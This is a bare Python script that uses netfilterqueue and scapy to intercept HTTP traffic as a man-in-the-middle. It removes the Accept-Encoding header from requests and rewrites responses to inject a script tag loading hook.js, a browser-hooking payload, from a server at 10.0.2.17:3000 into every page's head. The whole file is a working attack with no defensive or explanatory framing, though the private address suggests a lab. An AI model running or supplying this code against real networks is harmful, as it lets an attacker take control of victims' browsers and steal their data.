#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            load = load.replace(b"</head>", b'<script src="http://10.0.2.17:3000/hook.js"></script>'b'</head>')

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
